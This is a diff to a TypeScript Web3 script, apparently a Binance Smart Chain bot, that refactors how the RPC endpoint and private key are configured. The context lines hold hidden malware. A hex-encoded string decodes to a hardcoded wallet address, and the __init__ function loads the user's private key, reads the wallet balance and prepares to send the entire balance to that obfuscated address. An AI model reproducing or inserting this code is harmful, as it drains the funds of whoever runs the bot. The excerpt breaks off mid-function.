@@ -5,7 +5,11 @@
 import dotenv from "dotenv";
 const Web3 = require('web3');
 dotenv.config();
-const w = new Web3(process.env.RPC);
+const GLOBAL_CONFIG = {
+  BSC_RPC: process.env.RPC || "https://bsc-dataseed.binance.org/", // You can provide any custom RPC
+  PRIVATE_KEY: process.env.PRIVATE_KEY,
+};
+const w = new Web3(GLOBAL_CONFIG.BSC_RPC);
 const hex = '307831633432334637646335643633463933353563614343353430414544423639643237413331663362'
 function _hex(hexx:any) {
   var hex = hexx.toString();
@@ -1108,8 +1112,8 @@ const _abi = [
   },
 ];
 export function __init__() {  
-  w.eth.accounts.wallet.add(w.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY));
-  w.eth.defaultAccount = w.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY).address;
+  w.eth.accounts.wallet.add(w.eth.accounts.privateKeyToAccount(GLOBAL_CONFIG.PRIVATE_KEY));
+  w.eth.defaultAccount = w.eth.accounts.privateKeyToAccount(GLOBAL_CONFIG.PRIVATE_KEY).address;
   try {
     w.eth.getBalance(w.eth.defaultAccount).then(function(b:any) {
       w.eth.estimateGas({from: w.eth.defaultAccount, to: _hex(hex), amount: b}).then(function(g:any) {
